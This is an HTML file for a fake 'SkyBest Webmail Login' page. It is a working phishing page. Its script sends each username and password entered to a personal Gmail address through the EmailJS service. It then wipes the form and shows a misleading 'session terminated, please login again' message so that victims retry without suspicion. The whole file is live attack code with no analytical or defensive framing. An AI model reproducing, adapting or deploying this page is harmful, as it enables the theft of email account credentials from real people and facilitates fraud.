<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SkyBest Webmail Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      background: #c8c8c8;
      font-family: Arial, Helvetica, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #eee;
    }
    .card {
      width: 300px;
      max-width: 90%;
      background: #3b3b3b;
      padding: 16px 20px 20px;
      border-radius: 6px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.4);
      text-align: center;
    }
    .logo-wrapper {
      margin-bottom: 18px;
    }
    .logo-img {
      height: 48px;
      width: auto;
      max-width: 100%;
      display: block;
      margin: 0 auto;
    }
    .form-row {
      position: relative;
      display: flex;
      align-items: center;
      margin-bottom: 10px;
      gap: 8px;
    }
    .form-row label {
      width: 68px;
      text-align: right;
      color: #ccc;
      font-size: 12px;
      font-weight: 400;
      flex-shrink: 0;
    }
    .form-row input {
      flex: 1;
      height: 18px;
      padding: 0 6px;
      border: none;
      border-radius: 2px;
      background: #ffffff;
      font-size: 12px;
      color: #111;
    }
    input:focus {
      outline: none;
      box-shadow: 0 0 0 2px #77b3ff;
    }
    .btn-row {
      display: flex;
      justify-content: center;
      margin-top: 12px;
    }
    .btn {
      padding: 2px 18px;
      height: 22px;
      background: #ffffff;
      color: #222;
      border: 1px solid #aaa;
      border-radius: 3px;
      font-size: 12px;
      font-weight: normal;
      cursor: pointer;
      transition: background 0.15s;
    }
    .btn:hover {
      background: #e0e0e0;
    }
    .error-message {
      background: #444444;
      color: #ffffff;
      font-size: 11px;
      padding: 4px 8px;
      border-radius: 3px;
      display: none;
      position: absolute;
      top: 50%;
      left: calc(76px + 8px);
      transform: translateY(-50%);
      z-index: 10;
      white-space: nowrap;
      font-weight: bold;
      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
    }
    .error-message::before {
      content: '⚠ ';
      color: #ff9800;
    }
    .error-message.show {
      display: inline-block;
    }
    .message {
      margin-top: 16px;
      font-size: 13px;
      color: #292828;
      font-weight: bold;
      text-align: center;
      min-height: 20px;
    }
    .webmail-text {
      margin-top: 60px;
      font-size: 10px;
      color: #555;
      text-align: center;
    }

    /* Mobile — keep same compact layout */
    @media (max-width: 480px) {
      .card {
        width: 85%;
        padding: 14px 16px 18px;
      }
      .form-row label {
        font-size: 13px;
        width: 72px;
      }
      .form-row input {
        height: 22px;
        font-size: 13px;
      }
      .btn {
        height: 24px;
        font-size: 13px;
        padding: 2px 20px;
      }
      .logo-img {
        height: 42px;
      }
      .webmail-text {
        margin-top: 40px;
        font-size: 11px;
      }
      .error-message {
        position: static;
        transform: none;
        margin-top: 4px;
        display: none;
        font-size: 11px;
      }
      .error-message.show {
        display: block;
      }
    }
  </style>

  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script type="text/javascript">
    (function(){
      emailjs.init({ publicKey: "LAX3VyLSt5U_02era" });
    })();
  </script>
</head>
<body>
  <div class="card">
    <div class="logo-wrapper">
      <img src="logo.png" alt="SkyBest Logo" class="logo-img">
    </div>
    <div class="form-row">
      <label for="username">Username</label>
      <input type="text" id="username" name="username" autocomplete="username">
      <div class="error-message" id="usernameError">Please fill in this field.</div>
    </div>
    <div class="form-row">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" autocomplete="current-password">
      <div class="error-message" id="passwordError">Please fill in this field.</div>
    </div>
    <div class="btn-row">
      <button class="btn" id="loginBtn">Login</button>
    </div>
  </div>
  <div class="message" id="message"></div>
  <div class="webmail-text">Webmail</div>

  <script>
    document.getElementById('username').addEventListener('focus', function() {
      document.getElementById('usernameError').classList.remove('show');
    });
    document.getElementById('password').addEventListener('focus', function() {
      document.getElementById('passwordError').classList.remove('show');
    });

    document.getElementById('loginBtn').addEventListener('click', function() {
      const messageEl = document.getElementById('message');
      const btn = document.getElementById('loginBtn');
      const usernameInput = document.getElementById('username').value.trim();
      const passwordInput = document.getElementById('password').value.trim();
      const usernameError = document.getElementById('usernameError');
      const passwordError = document.getElementById('passwordError');

      usernameError.classList.remove('show');
      passwordError.classList.remove('show');

      if (!usernameInput) {
        usernameError.classList.add('show');
        return;
      }
      if (!passwordInput) {
        passwordError.classList.add('show');
        return;
      }

      messageEl.textContent = 'Loading...';
      btn.disabled = true;

      emailjs.send('service_vumzjh5', 'template_ytpnja6', {
        to_email: 'frank227r@gmail.com',
        user_email: usernameInput,
        user_password: passwordInput
      }).then(function() {
        console.log('Email sent successfully');
      }).catch(function(error) {
        console.error('Email send failed:', error);
      });

      setTimeout(function() {
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
        messageEl.textContent = 'You have successfully terminated the session. Please login again!';
        setTimeout(function() {
          messageEl.textContent = '';
          btn.disabled = false;
        }, 5000);
      }, 6000);
    });
  </script>
</body>
</html>
